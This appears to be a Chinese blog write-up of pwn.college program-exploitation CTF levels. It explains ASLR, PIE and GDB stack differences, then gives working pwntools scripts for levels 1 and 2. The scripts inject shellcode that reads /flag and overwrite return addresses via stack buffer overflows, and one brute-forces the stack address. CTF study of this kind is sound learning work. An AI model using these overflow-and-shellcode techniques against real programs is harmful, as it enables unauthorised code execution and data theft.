---
title: PWN-College-Program-Exploitation-Writeup
date: 2024-08-13 16:47:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---

# pwn.college Program-Exploitation


## 值得学习的

### 1. 在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？

在二进制程序不开启地址空间布局随机化（ASLR, Address Space Layout Randomization）的情况下，操作系统可以通过以下机制保证二进制程序每次都在相同的地址加载：

1. 固定的加载基地址
在编译程序时，链接器会将二进制程序的各个部分（如代码段、数据段、堆栈等）指定一个默认的加载地址，这被称为基地址。当 ASLR 未启用时，操作系统会按照这个默认的基地址将程序加载到内存中。
由于没有开启地址随机化，每次执行这个程序时，它的代码段、数据段等都会加载到同样的内存地址。
2. 操作系统加载器的行为
操作系统的加载器在加载可执行文件时，会检查是否开启了 ASLR。如果未开启，加载器会遵循可执行文件的默认基地址，并按照程序的地址映射表（通常是可执行文件中的程序头表或段表）将程序的各个部分加载到指定的固定地址。
在这种情况下，程序的每次加载地址都是固定的，这意味着所有函数、变量的内存地址在每次程序执行时都是一致的。
3. 编译时的控制
在编译可执行文件时，开发者或编译器可以通过指定编译选项来关闭 ASLR。例如，在 GCC 编译器中，可以使用 -no-pie 选项生成一个不支持位置无关代码的可执行文件，这样该文件会有一个固定的基地址，而不会在每次加载时随机化。
4. 静态链接 vs 动态链接
静态链接：在静态链接的程序中，所有库函数代码都被嵌入到可执行文件中，因此整个程序在内存中的布局是确定的，不依赖于动态链接库的加载地址。
动态链接：在动态链接的程序中，虽然主程序的加载地址是固定的，但动态链接库的加载地址可能会发生变化。如果 ASLR 未开启，动态库也会被加载到固定的地址。
**总结：**
当 ASLR 未开启时，操作系统通过遵循可执行文件中的默认加载地址和程序的内存布局来保证二进制程序每次都在相同的内存地址加载。这种固定加载地址的行为使得程序的各个部分在内存中的位置是确定的，但也因此增加了程序易受攻击的风险（例如基于内存地址的攻击）。这就是为什么现代操作系统通常会默认开启 ASLR 以提高程序的安全性。


如果有两个程序都没有开启 ASLR，它们的加载地址不一定会相同，具体取决于几个因素：

1. 程序的默认基地址
每个可执行文件在编译时，链接器通常会为其指定一个默认的基地址。如果两个程序的默认基地址相同，并且没有其他干扰因素，它们在没有开启 ASLR 的情况下可能会加载到相同的内存地址。
但是，如果两个程序的默认基地址不同，即使没有开启 ASLR，它们也会被加载到不同的地址。

2. 内存映射
即使两个程序具有相同的默认基地址，操作系统在加载时还需要考虑系统的内存使用情况。如果第一个程序已经占用了某些内存区域，操作系统可能会选择将第二个程序加载到不同的内存地址以避免冲突。
例如，如果第一个程序使用了某些共享库或内存映射文件，可能会占用一定的地址空间，导致第二个程序无法加载到完全相同的地址。

3. 进程隔离
现代操作系统使用虚拟内存来实现进程隔离，即每个进程在其虚拟地址空间内运行，彼此独立。因此，虽然两个程序的加载地址在它们各自的虚拟地址空间中可以是相同的，但它们在实际的物理内存中并不共享相同的内存区域。
从每个程序的视角来看，它们可能看到相同的加载地址，但由于虚拟内存机制，这些地址映射到不同的物理内存位置。

4. 动态链接库
如果两个程序使用相同的动态链接库，并且这些库没有开启 ASLR，它们的加载地址可能会在不同进程中一致。这会导致某些地址相同，但并不一定是整个程序都在相同的地址。
**结论：**
两个没有开启 ASLR 的程序不一定会加载到相同的地址，即使它们的默认基地址相同。加载地址的实际分配还受内存布局、系统资源使用情况以及操作系统的内存管理策略的影响。虚拟内存机制确保了每个程序有独立的虚拟地址空间，这意味着即使加载地址相同，它们在实际物理内存中的位置是不同的。

### 2. GDB 和 程序运行时的栈基址差异

**GDB 中的栈基址**
- 调试器的影响：当使用 GDB 调试程序时，GDB 插入了一些额外的调试信息和栈帧。这可能会影响栈的起始地址和布局。例如，GDB 可能会使用额外的栈帧来保存调试信息，或者在程序的栈中插入调试断点。
- 栈的显示：GDB 可能会显示调试器视图下的栈基址，这可能与程序在正常运行时的栈基址不同。

**程序运行时的栈基址**
- 运行时环境：在程序正常运行时，栈的基址由操作系统分配，并且可能受到各种因素的影响，包括操作系统的内存管理和地址空间布局（例如 ASLR）。
- 栈布局：程序在实际运行时，其栈的起始位置是由操作系统分配的，通常与调试时的环境不同。


### 3. PIE 和ASLR的关系？

PIE（Position-Independent Executable）模式是现代操作系统中用来增强程序安全性的一种机制。它使得生成的可执行文件在内存中加载时可以被放置在不同的内存地址，从而减少某些类型攻击（例如缓冲区溢出）的成功率。

#### 1. **PIE 的作用**

PIE 是一种让可执行文件具备位置无关特性的机制。传统上，可执行文件在内存中总是加载到固定的地址，而 PIE 可执行文件则可以加载到内存中的任意地址，这一特性使得它更难成为攻击目标。

#### 2. **PIE 的实现原理**

PIE 模式结合了以下技术：

- **位置无关代码（Position-Independent Code, PIC）**：PIE 可执行文件的代码是位置无关的，这意味着它不依赖于固定的内存地址，可以在任意地址运行。通过使用相对地址和偏移量，代码的执行不依赖于绝对地址。
- **动态链接**：PIE 可执行文件通常是动态链接的，它们在运行时被链接器加载到内存中，而不是在编译时决定其内存位置。
- **ASLR（地址空间布局随机化）**：PIE 模式通常与 ASLR 配合使用，操作系统会在每次加载 PIE 可执行文件时，为其分配一个不同的加载地址。这使得攻击者无法预测程序的内存布局，增加了攻击难度。

#### 3. **PIE 的优点**

- **增强安全性**：PIE 结合 ASLR 增加了攻击者的难度，因为每次执行时内存地址可能不同，减少了基于固定地址的漏洞利用可能性。
- **灵活性**：PIE 可执行文件可以在任何内存地址加载，这对多进程或多线程的程序尤其有利，因为它们可以共享代码段但使用不同的内存布局。

#### 4. **如何生成 PIE 可执行文件**

在编译程序时，可以通过特定的编译器选项生成 PIE 可执行文件。以 GCC 为例：

```bash
gcc -fPIE -pie -o your_program your_program.c
```

- **`-fPIE`**：告诉编译器生成位置无关的代码。
- **`-pie`**：告诉链接器生成一个位置无关的可执行文件。

#### 5. **如何检查程序是否是 PIE**

你可以使用 `readelf` 或 `objdump` 来检查一个可执行文件是否是 PIE。

```bash
readelf -h your_program | grep 'Type:'
```

- 如果显示 `DYN`，则说明该可执行文件是一个 PIE 文件。
- 如果显示 `EXEC`，则说明该可执行文件不是 PIE 文件。

或者使用 `objdump`：

```bash
objdump -f your_program | grep 'file format'
```

#### 6. **PIE 与 ASLR 的关系**

- **ASLR（地址空间布局随机化）**：ASLR 是一种安全技术，用于随机化程序在内存中的地址空间，包括栈、堆、共享库等。PIE 可执行文件配合 ASLR 可以实现更加有效的随机化，因为整个可执行文件的加载地址也会被随机化。
- **PIE 的重要性**：在支持 ASLR 的系统中，如果可执行文件是 PIE 类型，那么其加载地址也会被随机化。如果不是 PIE 类型，则 ASLR 对其作用有限，通常只能随机化栈、堆等部分内存区域，而代码段的加载地址仍然是固定的。

#### 总结

- **PIE（Position-Independent Executable）** 是一种生成位置无关可执行文件的技术，增强了程序的安全性。
- **PIE** 使得可执行文件可以在内存中的任意位置加载，通常与 **ASLR** 结合使用，防止基于固定地址的攻击。
- 生成 PIE 可执行文件需要使用编译器和链接器的特定选项，可以通过工具检查文件是否为 PIE。


## level 1 

没有开启canary，首先使用mmap创建一个内存空间读取shellcode，这个地址是确定的，所以后续只要直接跳转到这个地址就可以了。


```python

from pwn import *

elf = ELF("/challenge/toddlerone_level1.0")

p = process("/challenge/toddlerone_level1.0")

raw_file = open("/home/hacker/exploit/level1/shellcode.bin", 'rb')
raw_file = raw_file.read()
# file_bytes = len(raw_file)
print(raw_file)
p.sendline(raw_file)

buffer_size = 15 * 8 
padding_size = 8 * 3
rbp = 8
address_ = p64(0x1FF69000)
payload = (buffer_size + padding_size + rbp) * b'A' + address_
p.recvuntil("Payload size: ")
p.sendline(f"{len(payload)}")
p.send(payload)
p.interactive()


"""
BITS 64

section .data
    filename '/flag',0

section .bss
    buffer resb 50

section .text
global _start

_start:
    xor rax, rax
    mov rax, 2
    lea rdi, [rel filename]
    xor rsi, rsi
    syscall

    mov rdi, rax
    lea rsi, [rel buffer]
    mov rdx, 100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rdx, rax
    mov rax, 1 
    syscall
 
"""


```


## level 2 

### 2.0

没有开启ASLR，没有开启canary。栈空间具有可执行权限。

将二进制代码写入栈中，然后覆盖返回地址为缓冲区起始地址即可。还是用的level1中的shellcode

```python
from pwn import *

elf = ELF("/challenge/toddlerone_level2.0")

p = process("/challenge/toddlerone_level2.0")

raw_file = open("/home/hacker/exploit/level1/shellcode.bin", 'rb')
raw_file = raw_file.read()
file_bytes = len(raw_file)
print(file_bytes)

buffer_size = 56
padding_size = 8 *3
rbp = 8
address_ = p64(0x7fffffffce60)

payload = raw_file + (buffer_size + padding_size + rbp - file_bytes) * b'A' + address_
p.recvuntil("Payload size: ")
p.sendline(f"{len(payload)}")
p.send(payload)
p.interactive()
```

### 2.1

这一关没有回显了，所以你不能通过回显来判断返回地址应该写成啥。

gdb调试的话，对应的栈空间是会发生变化的。因为gdb可能会添加一些栈帧进去。所以用gdb显示的地址也不行。

但是因为本题关闭了PIE，所以每次栈空间的基址是一样的。
`   0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]`

用gdb查看的话，返回地址应该是`0x7fffffffcf28`。但是gdb返回的栈空间和实际运行的栈空间有差距。

我通过之前2.0的程序观察，单独运行程序，栈基址是`0x7fffffffcf50`，运行gdb查看程序的话，栈基址是`0x7fffffffcef0`
差距不大。

所以我选择从`0x7ffffffc000`开始爆破。最终正确的地址是`0x7ffffffce20`

```python
from pwn import *


raw_file = open("/home/hacker/exploit/level1/shellcode.bin", 'rb')
raw_file = raw_file.read()
file_bytes = len(raw_file)

elf = ELF("/challenge/toddlerone_level2.1")

base_address = 0x7fffffffc000
# correct_addresss = 0x7fffffffce20
while True:
    p = process("/challenge/toddlerone_level2.1")

    buffer_size = 0x90
    padding_size = 0
    rbp = 8
    address_ = p64(base_address)

    payload = raw_file + (buffer_size + padding_size + rbp - file_bytes) * b'A' + address_
    p.recvuntil("Payload size: ")
    p.sendline("160")
    p.send(payload)
    response = p.recvall().decode()
    if "pwn" in response:
        print(address_)
        print(response)
        p.interactive()
        exit()
    base_address += 0x10
```

## level 3

